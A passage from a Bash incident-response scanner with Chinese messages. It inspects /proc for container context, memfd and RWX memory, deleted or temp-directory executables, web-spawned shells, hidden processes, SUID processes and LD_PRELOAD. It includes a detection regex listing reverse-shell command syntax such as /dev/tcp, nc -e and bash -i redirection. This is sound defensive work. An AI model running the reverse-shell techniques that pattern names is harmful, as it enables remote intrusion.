        printf '%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\n' "${instance:-unknown}" "$pid" "$comm" "$runtime" "$clues" "$cmd" "$(printf '%s;%s' "$fds" "$mounts" | tr '\t\r\n' '   ')" "$(printf '%s' "$network" | tr '\t\r\n' '   ')" "$counter" CONTEXT >> "$out"
        KUBERNETES_CONTEXT_COUNT=$((KUBERNETES_CONTEXT_COUNT + 1))
        [ "$counter" = none ] || continue
        domains="PROCESS,FILE"; [ -z "$network" ] || domains="${domains},NETWORK"; [ -z "$persistence" ] || domains="${domains},PERSISTENCE"
        clue_count=$(awk -F, '{print NF}' <<< "$clues")
        finding_type=SECURITY_ANOMALY
        if [ "$clue_count" -ge 2 ] && [ "$(evidence_domain_count "$domains")" -ge 3 ]; then finding_type=SECURITY_THREAT; fi
        record_find HIGH process "容器/Kubernetes 高风险上下文: PID ${pid}" \
            "process_instance_id=${instance:-unknown}; runtime=${runtime}; clues=${clues}; command=${cmd}; fd_mount=${fds};${mounts}; network=${network:-none}; persistence=${persistence:-none}" \
            '核对工作负载规格、ServiceAccount、capabilities、host namespace 与运行时 Socket 授权' 'T1611' 'CNT-K8S-HIGH-VALUE-CONTEXT' "${instance:-pid:${pid}}" \
            'container-context.tsv,kubernetes-context.tsv,process-context.tsv,socket-snapshot.txt,events-normalized.jsonl' "$finding_type" MEDIUM \
            '运行时 Socket、ServiceAccount token、宿主路径或 host namespace 是逃逸与集群横向的重要上下文；单独命中仍需工作负载授权反证' \
            '只有同一稳定进程同时出现多个高风险线索，并关联网络、持久化或其他独立域证据时升级' "$domains" \
            "反证：${counter}；主机角色=${HOST_ROLE}；维护窗口=${MAINTENANCE_ACTIVE}" "$RUN_STARTED_AT|PROCESS|container context pid=$pid;$RUN_STARTED_AT|FILE|$clues"
        KUBERNETES_ANOMALY_COUNT=$((KUBERNETES_ANOMALY_COUNT + 1))
    done
    KUBERNETES_CONTEXT_STATUS=$([ "$KUBERNETES_CONTEXT_COUNT" -gt 0 ] && printf AVAILABLE || printf NO_RESULTS)
    record_raw_status 'kubernetes-context.tsv' "$([ "$KUBERNETES_CONTEXT_COUNT" -gt 0 ] && printf SUCCESS || printf NO_RESULTS)" container ''
}

collect_process_context_snapshot() {
    local status pid comm ppid uid euid loginuid tty exe clean_exe cmd ns container cap package_data owner verify ancestry starttime boot instance
    local cgroup runtime pod_uid k8s_namespace host_ns container_out="${RAW_DIR}/container-context.tsv" host_container=false
    local out="${RAW_DIR}/process-context.tsv"
    if [ "$NATIVE_RUNTIME_INITIAL_STATUS" = SUCCESS ] || [ "$NATIVE_RUNTIME_INITIAL_STATUS" = PARTIAL ]; then
        if [ -f "$out" ] && grep -q '^process_instance_id[[:space:]]' "$out"; then
            local native_process_status="$NATIVE_RUNTIME_INITIAL_STATUS"
            CONTAINER_CONTEXT_COUNT=$(awk 'NR>1 && NF>0 {n++} END{print n+0}' "$container_out" 2>/dev/null)
            CONTAINER_CONTEXT_COUNT=${CONTAINER_CONTEXT_COUNT:-0}
            record_raw_status 'process-context.tsv' "$native_process_status" process "native_runtime=${native_process_status}"
            if [ "$CONTAINER_CONTEXT_COUNT" -gt 0 ]; then
                CONTAINER_CONTEXT_STATUS=$([ "$native_process_status" = PARTIAL ] && printf PARTIAL || printf AVAILABLE)
                record_raw_status 'container-context.tsv' "$native_process_status" container "native_runtime=${native_process_status}"
            elif [ -e /.dockerenv ] || [ -e /run/.containerenv ] || [ "$HOST_ROLE" = kubernetes ]; then
                CONTAINER_CONTEXT_STATUS=NO_RESULTS
                record_raw_status 'container-context.tsv' NO_RESULTS container "native_runtime=${native_process_status};no_container_context"
            else
                CONTAINER_CONTEXT_STATUS=NOT_APPLICABLE
                record_raw_status 'container-context.tsv' NOT_APPLICABLE container 'no_container_context'
            fi
            if [ "$native_process_status" = PARTIAL ]; then mark_current_module_partial native_runtime_process_partial; fi
            collect_kubernetes_context
            return 0
        fi
        mark_current_module_partial native_runtime_process_output_invalid
    fi
    declare -A package_owner_cache=()
    boot=$(cat /proc/sys/kernel/random/boot_id 2>/dev/null || echo unknown)
    printf 'process_instance_id\tboot_id\tpid\tstarttime\tppid\tcomm\tuid\teuid\tloginuid\ttty\texe\tpackage\tpackage_verify\tcap_eff\tnamespaces\tcontainer_id\tancestors_5\targv\tcontainer_runtime\tpod_uid\tk8s_namespace\tcgroup_path\tnamespace_inode_summary\thost_namespace_suspicious\n' > "$out"
    printf 'pid\tprocess_instance_id\tcontainer_runtime\tcontainer_id\tpod_uid\tk8s_namespace\tcgroup_path\tnamespace_inode_summary\thost_namespace_suspicious\texe\targv\n' > "$container_out"
    [ -e /.dockerenv ] || [ -e /run/.containerenv ] && host_container=true
    CONTAINER_CONTEXT_COUNT=0
    for status in /proc/[0-9]*/status; do
        [ "$BENCHMARK_ENABLED" != 1 ] || BENCHMARK_PROC_PID_VISITS=$((BENCHMARK_PROC_PID_VISITS + 1))
        [ -r "$status" ] || continue
        pid="${status#/proc/}"; pid="${pid%/status}"
        starttime=$(awk '{print $22}' "/proc/${pid}/stat" 2>/dev/null); [ -n "$starttime" ] || continue
        comm=$(awk '/^Name:/ {print $2; exit}' "$status" 2>/dev/null); ppid=$(awk '/^PPid:/ {print $2; exit}' "$status" 2>/dev/null)
        uid=$(awk '/^Uid:/ {print $2; exit}' "$status" 2>/dev/null); euid=$(awk '/^Uid:/ {print $3; exit}' "$status" 2>/dev/null)
        loginuid=$(cat "/proc/${pid}/loginuid" 2>/dev/null || echo unknown); tty=$(readlink "/proc/${pid}/fd/0" 2>/dev/null || echo none)
        exe=$(readlink "/proc/${pid}/exe" 2>/dev/null || echo unknown); cmd=$(tr '\0\t\n' '   ' < "/proc/${pid}/cmdline" 2>/dev/null | head -c 800)
        cap=$(awk '/^CapEff:/ {print $2; exit}' "$status" 2>/dev/null)
        ns=$(for n in mnt pid net user uts ipc cgroup; do printf '%s=' "$n"; readlink "/proc/${pid}/ns/${n}" 2>/dev/null | sed 's/.*\[//;s/\]//'; done | tr '\n' ',')
        cgroup=$(awk -F: '{printf "%s%s",sep,$3;sep=","}' "/proc/${pid}/cgroup" 2>/dev/null)
        runtime=$(container_runtime_from_cgroup "$cgroup"); container=$(container_id_from_cgroup "$cgroup"); pod_uid=$(pod_uid_from_cgroup "$cgroup")
        k8s_namespace=$(k8s_namespace_for_pid "$pid"); host_ns=$(host_namespace_overlap "$pid" "$runtime")
        clean_exe="${exe% (deleted)}"
        if [ -n "${package_owner_cache[$clean_exe]+present}" ]; then
            owner="${package_owner_cache[$clean_exe]}"
        else
            owner=$(file_package_owner "$clean_exe"); [ -n "$owner" ] || owner=unowned
            package_owner_cache["$clean_exe"]="$owner"
        fi
        verify=NOT_CHECKED
        ancestry=$(process_ancestry_five "$pid")
        # Re-read starttime after collection so PID reuse cannot join fields
        # from two process instances.
        [ "$starttime" = "$(awk '{print $22}' "/proc/${pid}/stat" 2>/dev/null)" ] || continue
        instance="process:${boot}:${pid}:${starttime}:${exe}"
        printf '%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\n' \
            "$instance" "$boot" "$pid" "$starttime" "$ppid" "$comm" "$uid" "$euid" "$loginuid" "$tty" "$exe" "$owner" "$verify" "$cap" "$ns" "$container" "$ancestry" "$cmd" "$runtime" "$pod_uid" "$k8s_namespace" "$cgroup" "$ns" "$host_ns" | tr -d '\r' >> "$out"
        if [ "$runtime" != none ] || [ -n "$container$pod_uid" ]; then
            printf '%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\n' "$pid" "$instance" "$runtime" "$container" "$pod_uid" "$k8s_namespace" "$cgroup" "$ns" "$host_ns" "$exe" "$cmd" | tr -d '\r' >> "$container_out"
            CONTAINER_CONTEXT_COUNT=$((CONTAINER_CONTEXT_COUNT + 1))
        fi
    done
    record_raw_status 'process-context.tsv' SUCCESS process ''
    if [ "$CONTAINER_CONTEXT_COUNT" -gt 0 ]; then CONTAINER_CONTEXT_STATUS=AVAILABLE; record_raw_status 'container-context.tsv' SUCCESS container ''
    elif [ "$host_container" = true ] || [ "$HOST_ROLE" = kubernetes ]; then CONTAINER_CONTEXT_STATUS=NO_RESULTS; record_raw_status 'container-context.tsv' NO_RESULTS container ''
    else CONTAINER_CONTEXT_STATUS=NOT_APPLICABLE; record_raw_status 'container-context.tsv' NOT_APPLICABLE container 'no_container_context'; fi
    collect_kubernetes_context
}

check_advanced_process_behaviors() {
    local status pid comm exe argv argv0 network maps memfd_hit rwx_hit ancestry package_data owner verify domains detail allow_context identity_mismatch native_memory_file
    native_memory_file="${RAW_DIR}/native-executable-mappings-initial.tsv"
    [ "$PKG_MGR" != dpkg ] || prepare_package_owner_index
    for status in /proc/[0-9]*/status; do
        [ -r "$status" ] || continue
        pid="${status#/proc/}"; pid="${pid%/status}"
        comm=$(awk '/^Name:/ {print $2; exit}' "$status" 2>/dev/null); exe=$(readlink "/proc/${pid}/exe" 2>/dev/null || true)
        argv=$(tr '\0' ' ' < "/proc/${pid}/cmdline" 2>/dev/null | head -c 800); argv0=$(tr '\0' '\n' < "/proc/${pid}/cmdline" 2>/dev/null | head -1)
        if { [ "$NATIVE_RUNTIME_INITIAL_STATUS" = SUCCESS ] || [ "$NATIVE_RUNTIME_INITIAL_STATUS" = PARTIAL ]; } && [ -s "$native_memory_file" ]; then
            network=$(awk -F '\t' -v wanted="$pid" 'NR>1 && $2==wanted && $13!="" {print $13; exit}' "$native_memory_file" 2>/dev/null)
            maps=$(awk -F '\t' -v wanted="$pid" 'NR>1 && $2==wanted {printf "%s %s 0 0 0 0 %s\n", $5, $6, $7}' "$native_memory_file" 2>/dev/null | head -10)
        else
            network=$(socket_snapshot established | grep -E "pid=${pid}," | head -5)
            maps=$(grep -E 'memfd:|[[:space:]]rwxp?[[:space:]]' "/proc/${pid}/maps" 2>/dev/null | head -10)
        fi
        memfd_hit=$(printf '%s\n%s' "$exe" "$maps" | grep -E 'memfd:|/memfd:' | head -5)
        rwx_hit=$(printf '%s' "$maps" | grep -E '[[:space:]]rwxp?[[:space:]]' | head -5)
        identity_mismatch=false
        if [ -n "$argv0" ] && [ -n "$exe" ] && [ "$(basename -- "$argv0")" != "$comm" ] && [ "$(basename -- "${exe% (deleted)}")" != "$comm" ]; then identity_mismatch=true; fi
        [ -n "$memfd_hit$rwx_hit" ] || [ "$identity_mismatch" = true ] || continue
        ancestry=$(process_ancestry_five "$pid")
        package_data=$(process_package_and_integrity "${exe% (deleted)}"); IFS='|' read -r owner verify <<< "$package_data"
        allow_context=$(context_allow_match "$exe" "$(awk '/^Uid:/ {print $2; exit}' "$status" 2>/dev/null)" "$(cat "/proc/$(awk '/^PPid:/ {print $2; exit}' "$status" 2>/dev/null)/comm" 2>/dev/null)" "$argv" "$(printf '%s' "$network" | head -1)" 2>/dev/null || true)
        [ -z "$allow_context" ] || continue
        if [ -n "$memfd_hit" ]; then
            domains="MEMORY,PROCESS"; [ -z "$network" ] || domains="${domains},NETWORK"
            detail="PID=${pid}; comm=${comm}; exe=${exe}; argv=${argv}; memfd=${memfd_hit}; network=${network:-none}; package=${owner}; verify=${verify}; ancestors=${ancestry}"
            record_find HIGH process "memfd/匿名可执行进程: PID ${pid}" "$detail" '保全 /proc 上下文并核对创建者、连接和持久化；未经授权时进入响应' 'T1620' \
                'PRS-MEMFD-EXECUTION' "pid:${pid}" 'process-context.tsv,events-normalized.jsonl,ss_established.txt,proc/' \
                'SECURITY_THREAT' HIGH 'memfd 执行是强行为线索；是否为威胁取决于网络、父子关系和持久化等独立域' \
                '若关联公网连接、Web 祖先、注入或持久化，应升级为高置信威胁' "$domains" \
                "反证：包归属=${owner}，包校验=${verify}，维护窗口=${MAINTENANCE_ACTIVE}" \
                "$RUN_STARTED_AT|PROCESS|memfd execution pid=$pid;$RUN_STARTED_AT|NETWORK|${network:-none}"
        fi
        if [ -n "$rwx_hit" ]; then
            domains="MEMORY,PROCESS"; [ -z "$network" ] || domains="${domains},NETWORK"
            detail="PID=${pid}; comm=${comm}; exe=${exe}; rwx=${rwx_hit}; network=${network:-none}; ancestors=${ancestry}"
            record_find HIGH injection "匿名或可疑 RWX 映射: PID ${pid}" "$detail" '核对 JIT/运行时用途；提取映射和父进程证据' 'T1055' \
                'MEM-RWX-MAPPING' "pid:${pid}" 'process-context.tsv,events-normalized.jsonl,ss_established.txt,proc/' \
                'SECURITY_THREAT' MEDIUM 'RWX 可能来自 JIT，只有与异常执行或网络行为关联才进入威胁' \
                '若无 JIT/包/发布反证且关联注入、网络或持久化，应升级' "$domains" \
                "反证：包归属=${owner}，包校验=${verify}" "$RUN_STARTED_AT|MEMORY|RWX mapping pid=$pid"
        fi
        if [ "$identity_mismatch" = true ]; then
            detail="PID=${pid}; comm=${comm}; argv0=${argv0}; exe=${exe}; package=${owner}; verify=${verify}; ancestors=${ancestry}"
            record_find OBSERVE process "进程身份字段不一致: PID ${pid}" "$detail" '核对守护进程改名、解释器包装和容器入口；单独不判恶意' 'T1036' \
                'PRS-IDENTITY-MISMATCH' "pid:${pid}" 'process-context.tsv,proc/' 'SECURITY_ANOMALY' LOW \
                'comm、argv[0] 与 exe 不一致可由合法包装器或 setproctitle 产生，仅作辅助线索' \
                '若同时出现临时/删除/memfd 执行、包校验不一致或异常外连，应升级' 'PROCESS,INTEGRITY' \
                "反证：包归属=${owner}，包校验=${verify}" "$RUN_STARTED_AT|PROCESS|identity mismatch pid=$pid"
        fi
    done
}

#==============================================================================
# 03 — 进程检查
#==============================================================================

check_process() {
    local ps_snapshot="${RAW_DIR}/ps_auxww.txt"
    echo ""
    echo -e "${BOLD}${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    collect_socket_snapshot_once
    benchmark_stage_begin process_context_snapshot
    collect_process_context_snapshot
    benchmark_stage_end process_context_snapshot
    benchmark_stage_begin process_advanced_checks
    check_advanced_process_behaviors
    benchmark_stage_end process_advanced_checks
    dump_raw "ps_auxww.txt" ps auxww
    echo -e "${BOLD}${MAGENTA}  [03/12] 进程检查${NC}"
    echo -e "${BOLD}${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

    # 高 CPU 进程 — 挖矿特征
    echo -e "\n  ${BOLD}Top 10 CPU 进程:${NC}"
    { head -1 "$ps_snapshot"; tail -n +2 "$ps_snapshot" | LC_ALL=C sort -k3,3nr | head -10; } | while read -r line; do echo "    $line"; done

    local high_cpu_raw=$(awk 'NR>1 && $3>80 {print $2, $3"%", $11}' "$ps_snapshot" | head -10)
    # 排除白名单路径/进程的高 CPU 进程
    local high_cpu=""
    while IFS= read -r line; do
        [ -z "$line" ] && continue
        local pid=$(echo "$line" | awk '{print $1}')
        local pname=$(echo "$line" | awk '{print $3}')
        local exe=$(readlink "/proc/${pid}/exe" 2>/dev/null)
        if is_whitelisted_path "$exe" || is_whitelisted "$(basename "$pname")"; then
            continue  # 白名单进程，跳过
        fi
        high_cpu="${high_cpu}${line}\n"
    done <<< "$high_cpu_raw"
    high_cpu=$(echo -e "$high_cpu" | grep -v '^$')
    if [ -n "$high_cpu" ]; then
        emit_find "OBSERVE" "高 CPU 占用进程（性能观察）" \
            "$(echo "$high_cpu" | head -5 | tr '\n' '; ')" \
            "核实是否为正常业务负载；只有与矿池、可疑进程名、异常路径或持久化组合时才升级"
        record_find "OBSERVE" "performance" "高 CPU 进程(非白名单)" "$high_cpu" "核实业务负载并关联网络、路径和持久化" "" \
            "OBS-PROCESS-HIGH-CPU" "high-cpu-processes" "ps_auxww.txt,module-process.log" "RUNTIME_OBSERVATION" "LOW" \
            '仅观察到瞬时高 CPU，单一性能指标不能证明挖矿或入侵' '若同时出现矿池连接、挖矿进程特征、异常路径或持久化，应升级为安全威胁'
    fi

    # /proc 交叉验证 — 发现被 rootkit 隐藏的进程
    echo -e "\n  ${BOLD}/proc PID 范围 vs ps 输出对比:${NC}"
    local proc_pids=""
    for pid_dir in /proc/[0-9]*; do
        [ -d "$pid_dir" ] && proc_pids+="${pid_dir##*/}\n"
    done
    proc_pids=$(printf '%b' "$proc_pids" | sort -n)
    local proc_count=$(echo "$proc_pids" | grep -c . 2>/dev/null || true)
    local ps_pids=$(ps -eo pid= 2>/dev/null | tr -d ' ' | sort -n)
    local ps_count=$(echo "$ps_pids" | grep -c . 2>/dev/null || true)

    # 短生命周期进程会让 /proc 与 ps 瞬时不一致；连续三次确认仍在 /proc、
    # 非僵尸且始终不出现在 ps 中，才按隐藏进程报告。
    local hidden=""
    if [ "$proc_count" -gt "$ps_count" ]; then
        sleep 0.2
        local ps_pids2=$(ps -eo pid= 2>/dev/null | tr -d ' ' | sort -n)
        sleep 0.2
        local ps_pids3=$(ps -eo pid= 2>/dev/null | tr -d ' ' | sort -n)
        while IFS= read -r pid; do
            [ -z "$pid" ] && continue
            local proc_state
            proc_state=$(awk '{print $3}' "/proc/$pid/stat" 2>/dev/null || true)
            if ! grep -qx "$pid" <<< "$ps_pids2" && \
               ! grep -qx "$pid" <<< "$ps_pids3" && \
               [ -r "/proc/$pid/status" ] && [ "$proc_state" != "Z" ]; then
                hidden+="${pid}\n"
            fi
        done <<< "$proc_pids"
        hidden=$(printf '%b' "$hidden" | head -10)
    fi
    if [ -n "$hidden" ]; then
        emit_find "CRITICAL" "/proc 与 ps 进程数不一致 — 可能存在隐藏进程" \
            "/proc: ${proc_count} / ps: ${ps_count} / 隐藏 PID: $(echo $hidden | tr '\n' ' ')" \
            "可能存在 rootkit 隐藏的恶意进程，使用 unhide 或内存取证工具深入检查"
        record_find "CRITICAL" "rootkit" "隐藏进程" "proc=${proc_count} ps=${ps_count}" "rootkit 深度检查" "T1014"
        for pid in $hidden; do
            add_ioc "PID" "$pid" "隐藏进程"
        done
    else
        log_info "进程数一致 (/proc: ${proc_count}, ps: ${ps_count})"
    fi

    # 无文件进程 — /proc/PID/exe -> (deleted)。结合路径与包归属分级，避免把升级后未重启的系统服务直接判为高危。
    local deleted_procs=()
    for pid_dir in /proc/[0-9]*; do
        local exe_link=$(readlink "${pid_dir}/exe" 2>/dev/null || echo "")
        if echo "$exe_link" | grep -q '(deleted)'; then
            local pid=$(basename "$pid_dir")
            local cmdline=$(tr '\0' ' ' < "${pid_dir}/cmdline" 2>/dev/null)
            local exe_path="${exe_link% (deleted)}"
            local package_owner="" deleted_network="" deployment_context="" deleted_sev="HIGH" deleted_reason="未找到可信包归属"
            local deleted_type="SECURITY_ANOMALY" deleted_confidence="MEDIUM" deleted_rule="PRS-DELETED-UNOWNED" deleted_mitre="T1070.004"
            deleted_network=$(socket_snapshot established | grep -E "pid=${pid}," | head -3)
            case "$PKG_MGR" in
                rpm) package_owner=$(rpm -qf -- "$exe_path" 2>/dev/null | head -1) ;;
                dpkg) package_owner=$(file_package_owner "$exe_path") ;;
            esac
            deployment_context=$(trusted_change_context_for_pid "$pid" 2>/dev/null || true)
            if [[ "$exe_path" =~ ^/(tmp|var/tmp|dev/shm)/ ]]; then
                deleted_sev="CRITICAL"
                deleted_reason="可执行文件位于临时目录且已删除"
                deleted_type="SECURITY_THREAT"
                deleted_confidence="HIGH"
            elif [ -n "$deleted_network" ] && [ -z "$package_owner" ]; then
                deleted_sev="HIGH"
                deleted_reason="无可信包归属的已删除可执行文件仍存在网络连接"
                deleted_type="SECURITY_THREAT"
                deleted_confidence="HIGH"
                deleted_rule="PRS-DELETED-NETWORK"
            elif [ -n "$package_owner$deployment_context" ]; then
                deleted_sev="OBSERVE"
                deleted_reason="文件属于已安装软件包或处于可信升级/发布进程树，通常是升级后进程尚未重启"
                deleted_type="SECURITY_ANOMALY"
                deleted_confidence="LOW"
                deleted_rule="PRS-DELETED-PACKAGED"
                deleted_mitre=""
            fi
            local deleted_detail="PID ${pid}; exe=${exe_link}; package=${package_owner:-unowned}; deployment_context=${deployment_context:-none}; network=${deleted_network:-none}; cmd=${cmdline:0:160}; assessment=${deleted_reason}"
            deleted_procs+=("PID ${pid}: ${cmdline:0:120}")
            emit_find "$deleted_sev" "运行中的可执行文件已删除: ${exe_path}" \
                "$deleted_detail" \
                "核对软件包升级、服务启动时间和进程来源；无可信归属时再按无文件恶意进程处置"
            record_find "$deleted_sev" "process" "运行中的可执行文件已删除: ${exe_path}" \
                "$deleted_detail" "核对包升级记录和服务启动时间；无可信归属时再提取进程证据" "$deleted_mitre" \
                "$deleted_rule" "$exe_path" "ps_auxww.txt,proc/,recent_packages.txt" "$deleted_type" "$deleted_confidence" \
                "${deleted_reason}；仅有 (deleted) 标记不能证明规避取证或入侵" \
                "若无包归属、位于临时目录、进程存在异常外连或持久化关联，应升级处置"
            [ "$deleted_type" != "SECURITY_THREAT" ] || add_ioc "Process" "PID ${pid}: ${exe_path}" "$deleted_reason"
        fi
    done
    if [ "${#deleted_procs[@]}" -eq 0 ]; then
        log_info "无文件进程检查通过"
    fi

    # 异常路径进程 — /tmp, /dev/shm
    local tmp_procs=$(grep -E '/tmp/|/dev/shm/|/var/tmp/' "$ps_snapshot" | grep -v grep | grep -v 'npm\|node_modules\|pip\|python.*cache' | head -20)
    if [ -n "$tmp_procs" ]; then
        local tmp_pid tmp_network="" tmp_sev="MEDIUM" tmp_type="SECURITY_ANOMALY" tmp_confidence="MEDIUM"
        while IFS= read -r tmp_pid; do
            [[ "$tmp_pid" =~ ^[0-9]+$ ]] || continue
            tmp_network+="$(socket_snapshot established | grep -E "pid=${tmp_pid}," | head -3)"
        done < <(printf '%s\n' "$tmp_procs" | awk '{print $2}')
        if [ -n "$tmp_network" ]; then
            tmp_sev="HIGH"; tmp_type="SECURITY_THREAT"; tmp_confidence="HIGH"
        fi
        emit_find "$tmp_sev" "临时目录下存在运行进程" \
            "进程=$(echo "$tmp_procs" | head -3 | tr '\n' ';'); 网络=${tmp_network:-none}" \
            "核对文件来源、父进程、哈希和网络；仅在出现行为关联时按威胁处置"
        record_find "$tmp_sev" "process" "临时目录进程" \
            "进程=$(echo "$tmp_procs" | head -5 | tr '\n' ';'); 网络=${tmp_network:-none}" \
            "检查文件、父进程和网络" "T1204.002" "PRS-TEMP-EXECUTION" "temp-execution" \
            "ps_auxww.txt,ss_established.txt,proc/" "$tmp_type" "$tmp_confidence" \
            '从临时目录运行值得关注，但开发、安装和运维脚本也可能正常使用临时目录' \
            '若进程同时存在公网连接、Web 服务祖先进程、持久化或恶意哈希，应升级为安全威胁'
    else
        log_info "临时目录进程检查通过"
    fi

    # Web 进程派生 shell — webshell 特征
    local web_shells=$(web_shell_children | head -10)
    if [ -n "$web_shells" ]; then
        emit_find "HIGH" "Web 服务进程派生 Shell/解释器 — 待与网络和文件行为关联" \
            "$(echo "$web_shells" | head -3)" \
            "核对框架任务、发布流程和网络；出现 Socket/外连时按高置信威胁处置"
        record_find "HIGH" "webshell" "Web 进程派生 Shell" "$web_shells" "核对框架任务、发布流程和网络" "T1505.003" \
            "WEB-PROCESS-SHELL" "web-shell-lineage" "ps_auxww.txt,proc/,ss_established.txt" \
            "SECURITY_ANOMALY" "MEDIUM" 'Web 服务祖先进程派生 Shell 或解释器是强执行线索，但后台任务、构建或运维也可能产生' \
            '若同进程建立网络连接，或与 HTTP 请求和新增文件关联，应升级为安全威胁' 'WEB,PROCESS' \
            "反证：主机角色=${HOST_ROLE}，维护窗口=${MAINTENANCE_ACTIVE}" "$RUN_STARTED_AT|PROCESS|web child process"
        while IFS= read -r pid; do [[ "$pid" =~ ^[0-9]+$ ]] && dump_suspicious_proc "$pid" "web_shell" >/dev/null 2>&1 || true; done \
            < <(printf '%s\n' "$web_shells" | awk '{print $1}' | head -10)
    else
        log_info "Web 进程未发现异常派生"
    fi

    # 反弹 shell 关键字
    local rev_shell=$(grep -E '/dev/tcp/|/dev/udp/|nc -e.*(/bin/|/sh|cmd|powershell)|socat.*exec:|ncat.*-e|python.*socket.*connect|bash -i.*>&.*tcp|perl.*socket.*connect' "$ps_snapshot" | grep -v grep | head -10)
    if [ -n "$rev_shell" ]; then
        emit_find "HIGH" "发现反弹 Shell 命令行特征" \
            "$(echo "$rev_shell" | head -3)" \
            "立即核对进程网络与标准输入输出；形成 Socket 证据后按确认威胁处置"
        record_find "HIGH" "reverseshell" "反弹 Shell 命令行特征" "$rev_shell" "核对进程与网络" "T1059" \
            "REV-PROCESS-CMDLINE" "reverse-shell-cmdline" "ps_auxww.txt,ss_established.txt,proc/" \
            "SECURITY_ANOMALY" "MEDIUM" '命令行命中高风险语法，但仍可能来自授权测试或残留文本' \
            '若 Shell 标准输入输出连接 Socket，或与异常外连、Web 祖先进程关联，应升级为确认威胁'
        while IFS= read -r line; do
            [ -n "$line" ] && add_ioc "Process" "$(printf '%s' "$line" | head -c 200)" "反弹 Shell 命令行特征"
        done <<< "$rev_shell"
    else
        log_info "反弹 Shell 检查通过"
    fi

    # 不依赖固定端口：Shell/解释器的 stdin/stdout/stderr 与已建立 socket 关联。
    local socket_shells
    socket_shells=$(shell_socket_stdio | head -10)
    if [ -n "$socket_shells" ]; then
        emit_find "CRITICAL" "Shell 标准输入输出连接网络 Socket — 高度疑似反弹 Shell" \
            "$socket_shells" "立即保全 PID、进程树和连接信息并隔离对应会话"
        record_find "CRITICAL" "reverseshell" "Socket 反弹 Shell" "$socket_shells" "立即隔离并取证" "T1059" \
            "REV-SOCKET-STDIO" "reverse-shell-socket-stdio" "ps_auxww.txt,ss_established.txt,proc/" \
            "SECURITY_THREAT" "HIGH" 'Shell 或解释器的标准输入输出直接连接已建立网络 Socket，属于高特异性行为证据' \
            '核对父进程、远端地址和授权测试记录；非授权场景按主机失陷处置'
        while IFS= read -r pid; do [[ "$pid" =~ ^[0-9]+$ ]] && dump_suspicious_proc "$pid" "socket_shell" >/dev/null 2>&1 || true; done \
            < <(printf '%s\n' "$socket_shells" | sed -nE 's/^PID=([0-9]+).*/\1/p')
    else
        log_info "Shell Socket 标准输入输出检查通过"
    fi

    # SUID 提权检查
    local suid_procs=$(for f in /proc/[0-9]*/status; do
        [ -r "$f" ] || continue
        local uid_line real_uid eff_uid
        uid_line=$(grep '^Uid:' "$f" 2>/dev/null) || continue
        real_uid=$(printf '%s\n' "$uid_line" | awk '{print $2}')
        eff_uid=$(printf '%s\n' "$uid_line" | awk '{print $3}')
        [ "$real_uid" = "$eff_uid" ] && continue
        local pid exe_path
        pid="${f#/proc/}"; pid="${pid%/status}"
        exe_path=$(readlink "/proc/${pid}/exe" 2>/dev/null)
        # 跳过系统路径的合法 setuid 以及无 exe 的内核线程
        [ -z "$exe_path" ] && continue
        echo "$exe_path" | grep -qE '^/(usr/(bin|sbin|lib)|bin|sbin|lib)/' && continue
        echo "$f: real=$real_uid eff=$eff_uid exe=$exe_path"
    done | head -10)
    if [ -n "$suid_procs" ]; then
        emit_find "MEDIUM" "发现 SUID 提权进程 (real UID ≠ effective UID)" \
            "$(echo "$suid_procs" | head -3)" \
            "检查是否为合法的 setuid 程序"
        record_find "MEDIUM" "process" "SUID 提权进程" "$suid_procs" "核实是否为合法 setuid" "T1548.001" \
            "PRS-SUID-NONSTANDARD" "suid-nonstandard-process" "ps_auxww.txt,proc/" "SECURITY_ANOMALY" "MEDIUM" \
            'real/effective UID 不同且程序位于非标准路径，可能是自定义 setuid 工具，也可能是提权植入' \
            '若文件位于临时或用户目录、近期新增、无可信来源或产生异常外连，应升级处置'
    fi

    # 环境变量注入 — /proc/pid/environ 用 null 字节分隔，必须 tr 转换后逐行匹配
    # 否则会出现 PWD=/LD_PRELOAD=... 的粘连误报
    for pid_dir in /proc/[0-9]*; do
        [ -r "${pid_dir}/environ" ] || continue
        local pid=$(basename "$pid_dir")
        local pname=$(safe_read "${pid_dir}/comm" 2>/dev/null)
        local exe_path=$(readlink "${pid_dir}/exe" 2>/dev/null)
        # 正确的 environ 解析：\0 → \n，再匹配行首的 LD_PRELOAD=
        local ld_pre=$(tr '\0' '\n' < "${pid_dir}/environ" 2>/dev/null | grep -a '^LD_PRELOAD=.')
        if [ -n "$ld_pre" ]; then
            local preload_value="${ld_pre#LD_PRELOAD=}" preload_lib preload_owner="" preload_mode="" preload_package=""
            local preload_loaded=false preload_map="" proc_uid="" proc_euid="" proc_ppid="" proc_parent=""
            local ld_sev="OBSERVE" ld_type="SECURITY_ANOMALY" ld_confidence="LOW"
            local ld_reason="系统库路径中的预加载项，需确认是否属于终端安全或兼容组件" ld_rule="PRS-LD-PRELOAD-SYSTEM"
            preload_lib=$(printf '%s' "$preload_value" | tr ': ' '\n' | grep '^/' | head -1)
            if [ -n "$preload_lib" ] && [ -e "$preload_lib" ]; then
                preload_owner=$(stat -c '%U:%G' -- "$preload_lib" 2>/dev/null || true)
                preload_mode=$(stat -c '%a' -- "$preload_lib" 2>/dev/null || true)
                case "$PKG_MGR" in
                    rpm) preload_package=$(rpm -qf -- "$preload_lib" 2>/dev/null | head -1) ;;
                    dpkg) preload_package=$(file_package_owner "$preload_lib") ;;
                esac
                preload_map=$(grep -F -- "$preload_lib" "${pid_dir}/maps" 2>/dev/null | head -3)
                [ -n "$preload_map" ] && preload_loaded=true
            fi
            proc_uid=$(awk '/^Uid:/ {print $2; exit}' "${pid_dir}/status" 2>/dev/null)
            proc_euid=$(awk '/^Uid:/ {print $3; exit}' "${pid_dir}/status" 2>/dev/null)
            proc_ppid=$(awk '/^PPid:/ {print $2; exit}' "${pid_dir}/status" 2>/dev/null)
            proc_parent=$(cat "/proc/${proc_ppid}/comm" 2>/dev/null || echo unknown)
